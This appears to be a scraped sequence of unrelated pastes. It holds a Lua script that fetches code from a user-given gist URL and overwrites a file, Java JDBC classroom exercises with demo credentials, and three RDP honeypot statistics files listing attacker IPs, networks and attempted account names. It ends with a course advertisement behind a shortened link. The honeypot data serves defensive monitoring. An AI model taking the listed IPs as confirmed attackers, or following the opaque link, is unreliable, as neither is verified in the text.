local FILENAME_update = ""/""..user_file_named..""_update.lua""

print('give git gist url example: https://gist.githubusercontent.com/{user}/{gist_id}/raw/{name}')
local git_gist = read()
ress,err = http.get(git_gist)

if not ress then error(err) end

local code = ress.readAll()

if not (fs.exists(FILENAME_update))
then
    local newHarvest = fs.open(FILENAME_update,'w')
    local HostFileName = debug.getinfo(1,""S"").source
    i,j = string.find(HostFileName,""/"")
    local HostFileName = string.sub(HostFileName,i,string.len(HostFileName))
    newHarvest.write(fs.open(HostFileName,""r"").readAll())
    newHarvest.close()
end


if not (fs.exists(FILENAME))
then
    local newHarvest = fs.open(FILENAME,'w')
    newHarvest.close()
end

local readfile = fs.open(FILENAME,'r')
local oldCode = readfile.readAll()
readfile.close()

local file = fs.open(FILENAME, 'w')
 
if oldCode == code
then
    file.write(oldCode)
    print('NO CHANGES MADE - Same Code')
else
    file.write(code)
    print('WRITING UPDATE')
    byteDiff = string.len(code) - string.len(oldCode)
 
    if byteDiff >= 0
    then
        print(tostring(math.abs(byteDiff)) .. ' bytes added')
    else
        print(tostring(math.abs(byteDiff)) .. ' bytes removed')
    end
end
 
file.close()
ress.close()
"
EGe87mEf,Day 22 Methods,HarrJ,Java,Sunday 25th of February 2024 07:01:25 PM CDT,"package week4;

import java.util.Scanner;
public class Day22A {
//    Pwede natin paghiwalayin
//    pwede magsiksikan sila sa psvm
    
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        Day22MethodsLine callMethods = new Day22MethodsLine();
        String pName;
        double pPrice;
        String pMfg;
        String pCategory;
        String opt;
        String searchColumn;
        String searchValue;
        int rowsAffected;
        
        System.out.println(""Options:"");
        System.out.println(""1 - Add New Row"");
        System.out.println(""2 - View All Row"");
        System.out.println(""3 - Search by Product Name"");
        System.out.println(""any other character - View Table"");
        System.out.print("">> "");
        opt = sc.nextLine();
        
        switch (opt) {
            case ""1"" :
                try {
                    System.out.println(""Add New Row!!"");
                    System.out.print(""Enter Product Name: "");
                    pName = sc.nextLine();
                    System.out.print(""Enter Price: "");
                    pPrice = sc.nextDouble();
                    sc.nextLine();
                    System.out.print(""Enter Product Manufacturer: "");
                    pMfg = sc.nextLine();
                    System.out.print(""Enter Product Category: "");
                    pCategory = sc.nextLine();
                    
                    rowsAffected = callMethods.addNewRow(pName, pPrice, pMfg, pCategory);
                    
//                    System.out.println("">"" + pName);
//                    System.out.println("">"" + pPrice);
//                    System.out.println("">"" + pMfg);
//                    System.out.println("">"" + pCategory);
//                    System.out.println("">"" + rowsAffected);
                    if (rowsAffected == 1) {
                        System.out.println(""New row added"");
                    } else {
                        System.out.println(""There is problem in adding new row"");
                    }
                } catch (Exception e) {
                    System.out.println(e.toString());
                }
                break;
            case ""2"" : 
                callMethods.printAllRows();
                break;
            case ""3"" : 
                System.out.println(""type the option of which column to:(default by name)"");
                System.out.println(""A - search by product name"");
                System.out.println(""B - search by product manufacturer"");
                System.out.println(""C - search by product category"");
                System.out.print("">>> "");
                searchColumn = sc.nextLine();
                System.out.print(""Search Name: "");
                searchValue = sc.nextLine();
                callMethods.printAllRows(searchColumn, searchValue);
                break;
            default:
                System.out.println(""your selection is not an action"");
        }
    }
}

//--------------------------------------------------

package week4;

import java.sql.*;
public class Day22MethodsLine {
    private String address = ""jdbc:mysql://localhost:3306/db_jtvi_b8_23"";
    private String userName = ""jtvi23b8""; //default ""root""
    private String passWord = ""demo""; 
    
    int addNewRow(String name, double price, String mfg, String catName) {
        int rowsAffected = 0;
        try {
            Connection conn = DriverManager.getConnection(address, userName, passWord);
            String sqlQuery = ""INSERT INTO tbl_price_list (fld_pname ,fld_price""
                    + "" ,fld_manufacturer ,fld_cat_name)""
                    + "" VALUES (? ,? ,? ,? );"";
            
            PreparedStatement stmt = conn.prepareStatement(sqlQuery);
            stmt.setString(1, name);
            stmt.setDouble(2, price);
            stmt.setString(3, mfg);
            stmt.setString(4, catName);
            rowsAffected = stmt.executeUpdate();
            
            conn.close();
        } catch (Exception e) {
            rowsAffected = -1;
            System.out.println(e.toString());
        }
        return rowsAffected;
    }
    
    void printAllRows() { // pang command line na result
        try {
            Connection conn = DriverManager.getConnection(address, userName, passWord);
            String sqlQuery = ""SELECT fld_pid ,fld_pname ,fld_price ""
                    + "",fld_manufacturer ,fld_cat_name FROM tbl_price_list;"";
            
            PreparedStatement stmt = conn.prepareStatement(sqlQuery);
            
            ResultSet rs = stmt.executeQuery();
            
            while (rs.next()) {
                System.out.printf(""%-2d | %-35s | %-8.2f | %-35s | %-20s%n""
                    , rs.getInt(1)
                    , rs.getString(2)
                    , rs.getDouble(3)
                    , rs.getString(4)
                    , rs.getString(5)
                );
            }
            
        } catch (Exception e) {
            System.out.println(e.toString());
        }
    }
    
    // pwede na sana ito
    void printAllRows(String pName) { // pang command line na result
        String searchVal = ""%"" + pName + ""%"";
        try {
            Connection conn = DriverManager.getConnection(address, userName, passWord);
            String sqlQuery = ""SELECT fld_pid ,fld_pname ,fld_price ""
                    + "",fld_manufacturer ,fld_cat_name FROM tbl_price_list""
                    + "" WHERE fld_pname LIKE ?;"";
            
            PreparedStatement stmt = conn.prepareStatement(sqlQuery);
            stmt.setString(1, searchVal);
            
            ResultSet rs = stmt.executeQuery();
            
            while (rs.next()) {
                System.out.printf(""%-2d | %-35s | %-8.2f | %-35s | %-20s%n""
                    , rs.getInt(1)
                    , rs.getString(2)
                    , rs.getDouble(3)
                    , rs.getString(4)
                    , rs.getString(5)
                );
            }
            
        } catch (Exception e) {
            System.out.println(e.toString());
        }
    }
    
    // what if di lang pang isang field na where
    void printAllRows(String pField, String pSearch) { // pang command line na result
        String searchVal = ""%"" + pSearch + ""%"";
        String searchField;
        switch (pField) {
            case ""A"":
                searchField = ""fld_pname"";
                break;
            case ""B"":
                searchField = ""fld_manufacturer"";
                break;
            case ""C"":
                searchField = ""fld_cat_name"";
                break;
            default:
                searchField = ""fld_pname"";
        }
        try {
            Connection conn = DriverManager.getConnection(address, userName, passWord);
            String sqlQuery = ""SELECT fld_pid ,fld_pname ,fld_price ""
                    + "",fld_manufacturer ,fld_cat_name FROM tbl_price_list""
                    + "" WHERE "" + searchField + "" LIKE ?;"";
            
            PreparedStatement stmt = conn.prepareStatement(sqlQuery);
            stmt.setString(1, searchVal);
            
            ResultSet rs = stmt.executeQuery();
            
            while (rs.next()) {
                System.out.printf(""%-2d | %-35s | %-8.2f | %-35s | %-20s%n""
                    , rs.getInt(1)
                    , rs.getString(2)
                    , rs.getDouble(3)
                    , rs.getString(4)
                    , rs.getString(5)
                );
            }
            
        } catch (Exception e) {
            System.out.println(e.toString());
        }
    }
}

//CREATE TABLE tbl_price_list (
//    fld_pid INT NOT NULL AUTO_INCREMENT PRIMARY KEY
//    ,fld_pname VARCHAR (35) NOT NULL
//    ,fld_price DECIMAL (20, 4) NOT NULL
//    ,fld_manufacturer VARCHAR (35) NOT NULL
//    ,fld_cat_name VARCHAR (20) NOT NULL
//);"
CpqZzCxv,Day 22 Methods,HarrJ,Java,Sunday 25th of February 2024 07:01:24 PM CDT,"package week4;

import java.sql.*;
import javax.swing.JTable;
import javax.swing.table.DefaultTableModel;
public class Day22Methods {
    private String address = ""jdbc:mysql://localhost:3306/db_jtvi_b8_23"";
    private String userName = ""jtvi23b8""; //default ""root""
    private String passWord = ""demo""; 
    
    int addNewRow(String name, double price, String mfg, String catName) {
        int rowsAffected = 0;
        try {
            Connection conn = DriverManager.getConnection(address, userName, passWord);
            String sqlQuery = ""INSERT INTO tbl_price_list (fld_pname ,fld_price""
                    + "" ,fld_manufacturer ,fld_cat_name)""
                    + "" VALUES (? ,? ,? ,? );"";
            
            PreparedStatement stmt = conn.prepareStatement(sqlQuery);
            stmt.setString(1, name);
            stmt.setDouble(2, price);
            stmt.setString(3, mfg);
            stmt.setString(4, catName);
            rowsAffected = stmt.executeUpdate();
            
            conn.close();
        } catch (Exception e) {
            rowsAffected = -1;
            System.out.println(e.toString());
        }
        return rowsAffected;
    }
    
    void getAllRows(JTable tblReference) { // pang jFramee form
        DefaultTableModel tableModel = (DefaultTableModel) tblReference.getModel();
        tableModel.setRowCount(0);
        try {
            Connection conn = DriverManager.getConnection(address, userName, passWord);
            String sqlQuery = ""SELECT fld_pid ,fld_pname ,fld_price ""
                    + "",fld_manufacturer ,fld_cat_name FROM tbl_price_list;"";
            PreparedStatement stmt = conn.prepareStatement(sqlQuery);
            
            ResultSet rs = stmt.executeQuery();
            
            while (rs.next()) {
                Object[] newRow = {
                    rs.getInt(1)
                    , rs.getString(2)
                    , rs.getDouble(3)
                    , rs.getString(4)
                    , rs.getString(5)
                };
                tableModel.addRow(newRow);
            }
            
            conn.close();
        } catch (Exception e) {
            System.out.println(e.toString());
        }
    }
    
    void printAllRows() { // pang command line na result
        try {
            Connection conn = DriverManager.getConnection(address, userName, passWord);
            String sqlQuery = ""SELECT fld_pid ,fld_pname ,fld_price ""
                    + "",fld_manufacturer ,fld_cat_name FROM tbl_price_list;"";
            
            PreparedStatement stmt = conn.prepareStatement(sqlQuery);
            
            ResultSet rs = stmt.executeQuery();
            
            while (rs.next()) {
                System.out.printf(""%-2d | %-35s | %-8.2f | %-35s | %-20s%n""
                    , rs.getInt(1)
                    , rs.getString(2)
                    , rs.getString(3)
                    , rs.getString(4)
                    , rs.getString(5)
                );
            }
            
            System.out.println( rs );
        } catch (Exception e) {
            System.out.println(e.toString());
        }
    }
}

//CREATE TABLE tbl_price_list (
//    fld_pid INT NOT NULL AUTO_INCREMENT PRIMARY KEY
//    ,fld_pname VARCHAR (35) NOT NULL
//    ,fld_price DECIMAL (20, 4) NOT NULL
//    ,fld_manufacturer VARCHAR (35) NOT NULL
//    ,fld_cat_name VARCHAR (20) NOT NULL
//);"
WemwQcuz,2024-02-25_stats.json,rdp_snitch,JSON,Sunday 25th of February 2024 06:18:15 PM CDT,"{
  ""ip"": {
    ""45.33.87.154"": 3,
    ""103.120.19.215"": 3,
    ""194.165.16.76"": 12,
    ""58.218.204.183"": 18,
    ""45.227.254.55"": 6,
    ""205.210.31.207"": 9,
    ""39.105.141.202"": 6,
    ""45.131.195.119"": 3,
    ""87.251.75.145"": 9,
    ""36.91.222.100"": 3,
    ""212.70.149.142"": 12,
    ""123.56.20.194"": 3,
    ""179.60.147.118"": 3,
    ""190.124.32.18"": 6,
    ""81.19.135.147"": 3,
    ""205.210.31.184"": 9,
    ""185.11.61.106"": 3,
    ""194.165.16.72"": 6,
    ""37.114.57.42"": 3,
    ""120.240.145.8"": 3,
    ""165.154.36.245"": 3,
    ""173.239.214.231"": 3,
    ""205.210.31.73"": 9,
    ""173.237.25.68"": 3,
    ""210.3.96.246"": 9,
    ""194.165.16.10"": 3,
    ""87.251.75.64"": 3,
    ""15.235.189.144"": 3,
    ""27.184.195.229"": 3,
    ""39.98.127.243"": 3,
    ""43.133.48.153"": 3,
    ""89.248.170.88"": 3,
    ""205.210.31.201"": 9
  },
  ""asn"": {
    ""AS63949"": 3,
    ""AS131939"": 3,
    ""AS48721"": 21,
    ""AS4134"": 21,
    ""AS267784"": 6,
    ""AS396982"": 36,
    ""AS37963"": 12,
    ""AS62240"": 6,
    ""AS208091"": 12,
    ""AS7713"": 3,
    ""AS204428"": 12,
    ""AS209588"": 6,
    ""AS27742"": 6,
    ""AS57523"": 3,
    ""AS48314"": 3,
    ""AS56040"": 3,
    ""AS135377"": 3,
    ""AS7979"": 3,
    ""AS9304"": 9,
    ""AS16276"": 3,
    ""AS132203"": 3,
    ""AS202425"": 3
  },
  ""isp"": {
    ""Akamai Technologies, Inc."": 3,
    ""IPS INC"": 3,
    ""Flyservers S.A."": 33,
    ""Chinanet"": 21,
    ""Google LLC"": 36,
    ""Hangzhou Alibaba Advertising Co"": 12,
    ""VPN"": 3,
    ""Xhost Internet Solutions LP"": 12,
    ""PT Telekomunikasi Indonesia"": 3,
    ""SS-Net"": 12,
    ""Amnet Telecomunicaciones S.A."": 6,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Michael Sebastian Schinzel trading as IP-Projects GmbH & Co. KG"": 3,
    ""China Mobile communications corporation"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""LogicWeb Inc."": 3,
    ""Servers.com, Inc."": 3,
    ""HGC Global Communications Limited"": 9,
    ""OVH Singapore PTE. LTD"": 3,
    ""Aceville Pte.ltd"": 3,
    ""IP Volume inc"": 3
  },
  ""org"": {
    ""Linode"": 3,
    ""IPS Inc"": 3,
    ""Flyservers S.A"": 21,
    ""Chinanet JS"": 18,
    ""UAB Host Baltic"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Aliyun Computing Co., LTD"": 12,
    ""VPN-Consumer-US"": 3,
    ""Xhost Internet Solutions"": 12,
    ""Telekomunikasi Indonesia"": 3,
    ""4Media Ltd"": 12,
    ""Cloud Solutions S.A"": 3,
    ""Navega.com Nicaragua"": 6,
    ""Alviva Holding Limited"": 3,
    ""Starcrecium Limited"": 3,
    ""HosterAPI"": 3,
    ""China Mobile"": 3,
    ""Ucloud Information Technology"": 3,
    ""NSQ-VENTURE"": 3,
    ""Servers.com, Inc."": 3,
    ""HGC Global Communications Limited"": 9,
    ""Patrice, Auffret"": 3,
    ""Chinanet HE"": 3,
    ""Unknown"": 3,
    ""Quasi Networks LTD."": 3
  },
  ""regionName"": {
    ""New Jersey"": 9,
    ""Tokyo"": 3,
    ""Kaunas"": 21,
    ""Jiangsu"": 18,
    ""Vilnius"": 6,
    ""California"": 39,
    ""Beijing"": 12,
    ""North Holland"": 15,
    ""Jakarta"": 3,
    ""Plovdiv"": 12,
    ""Distrito Federal"": 3,
    ""Managua Department"": 6,
    ""Hesse"": 6,
    ""Chechnya"": 3,
    ""Guangdong"": 3,
    ""Texas"": 3,
    ""Eastern"": 9,
    ""North West"": 6,
    ""Hebei"": 3
  },
  ""country"": {
    ""United States"": 51,
    ""Japan"": 3,
    ""Lithuania"": 27,
    ""China"": 36,
    ""The Netherlands"": 15,
    ""Indonesia"": 3,
    ""Bulgaria"": 12,
    ""Venezuela"": 3,
    ""Nicaragua"": 6,
    ""Germany"": 6,
    ""Russia"": 3,
    ""Hong Kong"": 9,
    ""Singapore"": 6
  },
  ""account"": {
    ""(empty)"": 15,
    ""hello"": 45,
    ""Test"": 33,
    ""qvuUptIrd"": 3,
    ""zMmATa"": 3,
    ""PCbHZS"": 3,
    ""Administr"": 36,
    ""OiHqWrLJo"": 3,
    ""VQnVKC"": 3,
    ""cdVQJv"": 3,
    ""Administrator"": 6,
    ""pYPUqtPeq"": 3,
    ""bMdDWL"": 3,
    ""uuXyRz"": 3,
    ""Domain"": 9,
    ""uEJjIHPNH"": 3,
    ""dgSYuh"": 3,
    ""ASuXMu"": 3
  },
  ""keyboard"": {
    ""Unknown"": 180
  },
  ""client_build"": {
    ""Unknown"": 180
  },
  ""client_name"": {
    ""Unknown"": 180
  },
  ""ip_type"": {
    ""hosting"": 63,
    ""Unknown"": 105,
    ""hosting & proxy"": 6,
    ""proxy"": 3,
    ""mobile"": 3
  }
}"
TRpT2Wb4,2024-02-25_stats.json,rdp_snitch,JSON,Sunday 25th of February 2024 06:16:06 PM CDT,"{
  ""ip"": {
    ""45.33.87.154"": 2,
    ""103.120.19.215"": 2,
    ""194.165.16.76"": 8,
    ""58.218.204.183"": 12,
    ""45.227.254.55"": 4,
    ""205.210.31.207"": 6,
    ""39.105.141.202"": 4,
    ""45.131.195.119"": 2,
    ""87.251.75.145"": 6,
    ""36.91.222.100"": 2,
    ""212.70.149.142"": 8,
    ""123.56.20.194"": 2,
    ""179.60.147.118"": 2,
    ""190.124.32.18"": 4,
    ""81.19.135.147"": 2,
    ""205.210.31.184"": 6,
    ""185.11.61.106"": 2,
    ""194.165.16.72"": 4,
    ""37.114.57.42"": 2,
    ""120.240.145.8"": 2,
    ""165.154.36.245"": 2,
    ""173.239.214.231"": 2,
    ""205.210.31.73"": 6,
    ""173.237.25.68"": 2,
    ""210.3.96.246"": 6,
    ""194.165.16.10"": 2,
    ""87.251.75.64"": 2,
    ""15.235.189.144"": 2,
    ""27.184.195.229"": 2,
    ""39.98.127.243"": 2,
    ""43.133.48.153"": 2,
    ""89.248.170.88"": 2,
    ""205.210.31.201"": 6
  },
  ""asn"": {
    ""AS63949"": 2,
    ""AS131939"": 2,
    ""AS48721"": 14,
    ""AS4134"": 14,
    ""AS267784"": 4,
    ""AS396982"": 24,
    ""AS37963"": 8,
    ""AS62240"": 4,
    ""AS208091"": 8,
    ""AS7713"": 2,
    ""AS204428"": 8,
    ""AS209588"": 4,
    ""AS27742"": 4,
    ""AS57523"": 2,
    ""AS48314"": 2,
    ""AS56040"": 2,
    ""AS135377"": 2,
    ""AS7979"": 2,
    ""AS9304"": 6,
    ""AS16276"": 2,
    ""AS132203"": 2,
    ""AS202425"": 2
  },
  ""isp"": {
    ""Akamai Technologies, Inc."": 2,
    ""IPS INC"": 2,
    ""Flyservers S.A."": 22,
    ""Chinanet"": 14,
    ""Google LLC"": 24,
    ""Hangzhou Alibaba Advertising Co"": 8,
    ""VPN"": 2,
    ""Xhost Internet Solutions LP"": 8,
    ""PT Telekomunikasi Indonesia"": 2,
    ""SS-Net"": 8,
    ""Amnet Telecomunicaciones S.A."": 4,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Michael Sebastian Schinzel trading as IP-Projects GmbH & Co. KG"": 2,
    ""China Mobile communications corporation"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""LogicWeb Inc."": 2,
    ""Servers.com, Inc."": 2,
    ""HGC Global Communications Limited"": 6,
    ""OVH Singapore PTE. LTD"": 2,
    ""Aceville Pte.ltd"": 2,
    ""IP Volume inc"": 2
  },
  ""org"": {
    ""Linode"": 2,
    ""IPS Inc"": 2,
    ""Flyservers S.A"": 14,
    ""Chinanet JS"": 12,
    ""UAB Host Baltic"": 4,
    ""Palo Alto Networks, Inc"": 24,
    ""Aliyun Computing Co., LTD"": 8,
    ""VPN-Consumer-US"": 2,
    ""Xhost Internet Solutions"": 8,
    ""Telekomunikasi Indonesia"": 2,
    ""4Media Ltd"": 8,
    ""Cloud Solutions S.A"": 2,
    ""Navega.com Nicaragua"": 4,
    ""Alviva Holding Limited"": 2,
    ""Starcrecium Limited"": 2,
    ""HosterAPI"": 2,
    ""China Mobile"": 2,
    ""Ucloud Information Technology"": 2,
    ""NSQ-VENTURE"": 2,
    ""Servers.com, Inc."": 2,
    ""HGC Global Communications Limited"": 6,
    ""Patrice, Auffret"": 2,
    ""Chinanet HE"": 2,
    ""Unknown"": 2,
    ""Quasi Networks LTD."": 2
  },
  ""regionName"": {
    ""New Jersey"": 6,
    ""Tokyo"": 2,
    ""Kaunas"": 14,
    ""Jiangsu"": 12,
    ""Vilnius"": 4,
    ""California"": 26,
    ""Beijing"": 8,
    ""North Holland"": 10,
    ""Jakarta"": 2,
    ""Plovdiv"": 8,
    ""Distrito Federal"": 2,
    ""Managua Department"": 4,
    ""Hesse"": 4,
    ""Chechnya"": 2,
    ""Guangdong"": 2,
    ""Texas"": 2,
    ""Eastern"": 6,
    ""North West"": 4,
    ""Hebei"": 2
  },
  ""country"": {
    ""United States"": 34,
    ""Japan"": 2,
    ""Lithuania"": 18,
    ""China"": 24,
    ""The Netherlands"": 10,
    ""Indonesia"": 2,
    ""Bulgaria"": 8,
    ""Venezuela"": 2,
    ""Nicaragua"": 4,
    ""Germany"": 4,
    ""Russia"": 2,
    ""Hong Kong"": 6,
    ""Singapore"": 4
  },
  ""account"": {
    ""(empty)"": 10,
    ""hello"": 30,
    ""Test"": 22,
    ""qvuUptIrd"": 2,
    ""zMmATa"": 2,
    ""PCbHZS"": 2,
    ""Administr"": 24,
    ""OiHqWrLJo"": 2,
    ""VQnVKC"": 2,
    ""cdVQJv"": 2,
    ""Administrator"": 4,
    ""pYPUqtPeq"": 2,
    ""bMdDWL"": 2,
    ""uuXyRz"": 2,
    ""Domain"": 6,
    ""uEJjIHPNH"": 2,
    ""dgSYuh"": 2,
    ""ASuXMu"": 2
  },
  ""keyboard"": {
    ""Unknown"": 120
  },
  ""client_build"": {
    ""Unknown"": 120
  },
  ""client_name"": {
    ""Unknown"": 120
  },
  ""ip_type"": {
    ""hosting"": 42,
    ""Unknown"": 70,
    ""hosting & proxy"": 4,
    ""proxy"": 2,
    ""mobile"": 2
  }
}"
k4RUagcM,2024-02-25_stats.json,rdp_snitch,JSON,Sunday 25th of February 2024 06:15:09 PM CDT,"{
  ""ip"": {
    ""45.33.87.154"": 1,
    ""103.120.19.215"": 1,
    ""194.165.16.76"": 4,
    ""58.218.204.183"": 6,
    ""45.227.254.55"": 2,
    ""205.210.31.207"": 3,
    ""39.105.141.202"": 2,
    ""45.131.195.119"": 1,
    ""87.251.75.145"": 3,
    ""36.91.222.100"": 1,
    ""212.70.149.142"": 4,
    ""123.56.20.194"": 1,
    ""179.60.147.118"": 1,
    ""190.124.32.18"": 2,
    ""81.19.135.147"": 1,
    ""205.210.31.184"": 3,
    ""185.11.61.106"": 1,
    ""194.165.16.72"": 2,
    ""37.114.57.42"": 1,
    ""120.240.145.8"": 1,
    ""165.154.36.245"": 1,
    ""173.239.214.231"": 1,
    ""205.210.31.73"": 3,
    ""173.237.25.68"": 1,
    ""210.3.96.246"": 3,
    ""194.165.16.10"": 1,
    ""87.251.75.64"": 1,
    ""15.235.189.144"": 1,
    ""27.184.195.229"": 1,
    ""39.98.127.243"": 1,
    ""43.133.48.153"": 1,
    ""89.248.170.88"": 1,
    ""205.210.31.201"": 3
  },
  ""asn"": {
    ""AS63949"": 1,
    ""AS131939"": 1,
    ""AS48721"": 7,
    ""AS4134"": 7,
    ""AS267784"": 2,
    ""AS396982"": 12,
    ""AS37963"": 4,
    ""AS62240"": 2,
    ""AS208091"": 4,
    ""AS7713"": 1,
    ""AS204428"": 4,
    ""AS209588"": 2,
    ""AS27742"": 2,
    ""AS57523"": 1,
    ""AS48314"": 1,
    ""AS56040"": 1,
    ""AS135377"": 1,
    ""AS7979"": 1,
    ""AS9304"": 3,
    ""AS16276"": 1,
    ""AS132203"": 1,
    ""AS202425"": 1
  },
  ""isp"": {
    ""Akamai Technologies, Inc."": 1,
    ""IPS INC"": 1,
    ""Flyservers S.A."": 11,
    ""Chinanet"": 7,
    ""Google LLC"": 12,
    ""Hangzhou Alibaba Advertising Co"": 4,
    ""VPN"": 1,
    ""Xhost Internet Solutions LP"": 4,
    ""PT Telekomunikasi Indonesia"": 1,
    ""SS-Net"": 4,
    ""Amnet Telecomunicaciones S.A."": 2,
    ""Chang Way Technologies Co. Limited"": 1,
    ""Michael Sebastian Schinzel trading as IP-Projects GmbH & Co. KG"": 1,
    ""China Mobile communications corporation"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""LogicWeb Inc."": 1,
    ""Servers.com, Inc."": 1,
    ""HGC Global Communications Limited"": 3,
    ""OVH Singapore PTE. LTD"": 1,
    ""Aceville Pte.ltd"": 1,
    ""IP Volume inc"": 1
  },
  ""org"": {
    ""Linode"": 1,
    ""IPS Inc"": 1,
    ""Flyservers S.A"": 7,
    ""Chinanet JS"": 6,
    ""UAB Host Baltic"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""Aliyun Computing Co., LTD"": 4,
    ""VPN-Consumer-US"": 1,
    ""Xhost Internet Solutions"": 4,
    ""Telekomunikasi Indonesia"": 1,
    ""4Media Ltd"": 4,
    ""Cloud Solutions S.A"": 1,
    ""Navega.com Nicaragua"": 2,
    ""Alviva Holding Limited"": 1,
    ""Starcrecium Limited"": 1,
    ""HosterAPI"": 1,
    ""China Mobile"": 1,
    ""Ucloud Information Technology"": 1,
    ""NSQ-VENTURE"": 1,
    ""Servers.com, Inc."": 1,
    ""HGC Global Communications Limited"": 3,
    ""Patrice, Auffret"": 1,
    ""Chinanet HE"": 1,
    ""Unknown"": 1,
    ""Quasi Networks LTD."": 1
  },
  ""regionName"": {
    ""New Jersey"": 3,
    ""Tokyo"": 1,
    ""Kaunas"": 7,
    ""Jiangsu"": 6,
    ""Vilnius"": 2,
    ""California"": 13,
    ""Beijing"": 4,
    ""North Holland"": 5,
    ""Jakarta"": 1,
    ""Plovdiv"": 4,
    ""Distrito Federal"": 1,
    ""Managua Department"": 2,
    ""Hesse"": 2,
    ""Chechnya"": 1,
    ""Guangdong"": 1,
    ""Texas"": 1,
    ""Eastern"": 3,
    ""North West"": 2,
    ""Hebei"": 1
  },
  ""country"": {
    ""United States"": 17,
    ""Japan"": 1,
    ""Lithuania"": 9,
    ""China"": 12,
    ""The Netherlands"": 5,
    ""Indonesia"": 1,
    ""Bulgaria"": 4,
    ""Venezuela"": 1,
    ""Nicaragua"": 2,
    ""Germany"": 2,
    ""Russia"": 1,
    ""Hong Kong"": 3,
    ""Singapore"": 2
  },
  ""account"": {
    ""(empty)"": 5,
    ""hello"": 15,
    ""Test"": 11,
    ""qvuUptIrd"": 1,
    ""zMmATa"": 1,
    ""PCbHZS"": 1,
    ""Administr"": 12,
    ""OiHqWrLJo"": 1,
    ""VQnVKC"": 1,
    ""cdVQJv"": 1,
    ""Administrator"": 2,
    ""pYPUqtPeq"": 1,
    ""bMdDWL"": 1,
    ""uuXyRz"": 1,
    ""Domain"": 3,
    ""uEJjIHPNH"": 1,
    ""dgSYuh"": 1,
    ""ASuXMu"": 1
  },
  ""keyboard"": {
    ""Unknown"": 60
  },
  ""client_build"": {
    ""Unknown"": 60
  },
  ""client_name"": {
    ""Unknown"": 60
  },
  ""ip_type"": {
    ""hosting"": 21,
    ""Unknown"": 35,
    ""hosting & proxy"": 2,
    ""proxy"": 1,
    ""mobile"": 1
  }
}"
FX84RRmn,Untitled,f0f077,Python,Sunday 25th of February 2024 05:33:05 PM CDT,"The Modern Python 3 Bootcamp
A Unique Interactive Python Experience With Nearly 200 Exercises and Quizzes

What you'll learn
Learn all the coding fundamentals in Python!
Work through nearly 200 exercises and quizzes!
Learn about all of the latest features in Python 3.6
Use Python to create an automated web crawler and scraper
for more:https://cuty.io/0CoYMqArUo"
